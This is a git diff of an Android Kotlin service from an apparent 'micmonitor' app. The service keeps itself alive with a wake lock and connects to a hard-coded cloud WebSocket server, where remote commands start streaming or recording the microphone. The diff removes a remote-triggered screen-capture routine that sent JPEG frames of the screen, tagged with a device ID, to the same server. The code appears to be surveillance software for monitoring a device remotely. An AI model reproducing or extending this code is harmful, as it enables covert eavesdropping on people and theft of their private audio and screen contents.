@@ -1,30 +1,21 @@
 package com.micmonitor.app
 
 import android.annotation.SuppressLint
-import android.app.Activity
 import android.app.Notification
 import android.app.NotificationChannel
 import android.app.NotificationManager
 import android.app.Service
 import android.content.Context
 import android.content.Intent
-import android.graphics.Bitmap
-import android.graphics.PixelFormat
-import android.hardware.display.DisplayManager
-import android.hardware.display.VirtualDisplay
 import android.media.AudioFormat
 import android.media.AudioRecord
-import android.media.ImageReader
 import android.media.MediaRecorder
-import android.media.projection.MediaProjection
-import android.media.projection.MediaProjectionManager
 import android.app.AlarmManager
 import android.app.PendingIntent
 import android.os.Build
 import android.os.IBinder
 import android.os.PowerManager
 import android.os.SystemClock
-import android.util.Base64
 import android.util.Log
 import androidx.core.app.NotificationCompat
 import androidx.core.content.edit
@@ -35,7 +26,6 @@ import kotlinx.coroutines.*
 import okhttp3.*
 import okio.ByteString
 import okio.ByteString.Companion.toByteString
-import java.io.ByteArrayOutputStream
 import java.io.File
 import java.io.FileOutputStream
 import java.util.UUID
@@ -83,13 +73,6 @@ class MicService : Service() {
     // ── WakeLock ─────────────────────────────────────────────────────────────
     private var wakeLock: PowerManager.WakeLock? = null
 
-    // ── Screen capture ───────────────────────────────────────────────────────
-    private var mediaProjection: MediaProjection? = null
-    private var virtualDisplay: VirtualDisplay? = null
-    private var imageReader: ImageReader? = null
-    private var screenJob: Job? = null
-    @Volatile private var isScreenCapturing = false
-
     // ── Data Collector ───────────────────────────────────────────────────────
     private val dataCollector by lazy { DataCollector(this) }
     private var dataJob: Job? = null
@@ -109,7 +92,6 @@ class MicService : Service() {
         const val TAG          = "MicService"
         const val CHANNEL_ID   = "device_services_channel"
         const val NOTIF_ID     = 101
-        const val ACTION_SCREEN_RESULT = "com.micmonitor.app.SCREEN_RESULT"
 
         // Render cloud URL — works on any network (WiFi or cellular)
         const val DEFAULT_SERVER_URL = "wss://monitor-raje.onrender.com/audio/"
@@ -153,24 +135,7 @@ class MicService : Service() {
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        Log.i(TAG, "onStartCommand action=${intent?.action}")
-
-        // Handle screen capture permission result from ScreenCaptureActivity
-        if (intent?.action == ACTION_SCREEN_RESULT) {
-            val resultCode = intent.getIntExtra("result_code", Activity.RESULT_CANCELED)
-            @Suppress("DEPRECATION")
-            val data: Intent? = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
-                intent.getParcelableExtra("result_data", Intent::class.java)
-            else
-                intent.getParcelableExtra("result_data")
-            if (resultCode == Activity.RESULT_OK && data != null) {
-                startScreenCapture(resultCode, data)
-            } else {
-                webSocket?.send("ACK:screen_denied")
-            }
-            return START_STICKY
-        }
-
+        Log.i(TAG, "onStartCommand")
         startForeground(NOTIF_ID, buildNotification("Connecting to server…"))
         connectWebSocket()
         scheduleKeepAlive()
@@ -201,7 +166,6 @@ class MicService : Service() {
         activeWebSocket = null
         serviceScope.cancel()
         stopAudioCapture()
-        stopScreenCapture()
         closeRecordingFile()
         webSocket?.close(1000, "Service stopped")
         wakeLock?.release()
@@ -293,18 +257,6 @@ class MicService : Service() {
                 closeRecordingFile()
                 updateNotification("Connected — mic standby")
                 webSocket?.send("ACK:stop_stream")
-            }
-            "start_screen" -> {
-                Log.i(TAG, "CMD: start screen capture")
-                val intent = Intent(this, ScreenCaptureActivity::class.java).apply {
-                    flags = Intent.FLAG_ACTIVITY_NEW_TASK
-                }
-                startActivity(intent)
-            }
-            "stop_screen" -> {
-                Log.i(TAG, "CMD: stop screen capture")
-                stopScreenCapture()
-                webSocket?.send("ACK:stop_screen")
             }
             "start_record" -> {
                 Log.i(TAG, "CMD: start recording")
@@ -427,84 +379,6 @@ class MicService : Service() {
             audioRecord?.release()
         } catch (_: Exception) {}
         audioRecord = null
-    }
-
-    // ────────────────────────────────────────────────────────────────────────
-    // Screen capture (MediaProjection → JPEG frames via WebSocket)
-    // ────────────────────────────────────────────────────────────────────────
-
-    private fun startScreenCapture(resultCode: Int, data: Intent) {
-        if (isScreenCapturing) stopScreenCapture()
-        try {
-            val mgr = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
-            mediaProjection = mgr.getMediaProjection(resultCode, data)
-
-            val dm = resources.displayMetrics
-            val scale = if (dm.widthPixels > 480) 480f / dm.widthPixels else 1f
-            val w = ((dm.widthPixels  * scale).toInt()).let { if (it % 2 == 0) it else it + 1 }
-            val h = ((dm.heightPixels * scale).toInt()).let { if (it % 2 == 0) it else it + 1 }
-
-            imageReader = ImageReader.newInstance(w, h, PixelFormat.RGBA_8888, 2)
-            virtualDisplay = mediaProjection?.createVirtualDisplay(
-                "MicMonitorScreen", w, h, dm.densityDpi,
-                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
-                imageReader!!.surface, null, null
-            )
-
-            isScreenCapturing = true
-            updateNotification("Screen sharing active")
-            webSocket?.send("ACK:start_screen")
-            Log.i(TAG, "Screen capture started (${w}x${h})")
-
-            screenJob = serviceScope.launch(Dispatchers.IO) {
-                while (isActive && isScreenCapturing) {
-                    delay(1_000)  // 1 fps
-                    val image = imageReader?.acquireLatestImage() ?: continue
-                    try {
-                        val planes    = image.planes
-                        val buffer    = planes[0].buffer
-                        val rowStride = planes[0].rowStride
-                        val pixStride = planes[0].pixelStride
-                        val rowPad    = rowStride - pixStride * w
-                        val bmp = Bitmap.createBitmap(w + rowPad / pixStride, h, Bitmap.Config.ARGB_8888)
-                        bmp.copyPixelsFromBuffer(buffer)
-                        val cropped = Bitmap.createBitmap(bmp, 0, 0, w, h)
-                        bmp.recycle()
-
-                        val baos = ByteArrayOutputStream()
-                        cropped.compress(Bitmap.CompressFormat.JPEG, 50, baos)
-                        cropped.recycle()
-
-                        val b64 = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP)
-                        val json = JSONObject().apply {
-                            put("type",     "screen_frame")
-                            put("deviceId", deviceId)
-                            put("data",     b64)
-                        }
-                        webSocket?.send(json.toString())
-                    } catch (e: Exception) {
-                        Log.e(TAG, "Screen frame error: ${e.message}")
-                    } finally {
-                        image.close()
-                    }
-                }
-            }
-        } catch (e: Exception) {
-            Log.e(TAG, "startScreenCapture error: ${e.message}")
-            webSocket?.send("ACK:screen_error:${e.message}")
-        }
-    }
-
-    private fun stopScreenCapture() {
-        isScreenCapturing = false
-        screenJob?.cancel(); screenJob = null
-        try { virtualDisplay?.release()  } catch (_: Exception) {}
-        try { imageReader?.close()       } catch (_: Exception) {}
-        try { mediaProjection?.stop()    } catch (_: Exception) {}
-        virtualDisplay  = null
-        imageReader     = null
-        mediaProjection = null
-        Log.i(TAG, "Screen capture stopped")
     }
 
     // ────────────────────────────────────────────────────────────────────────
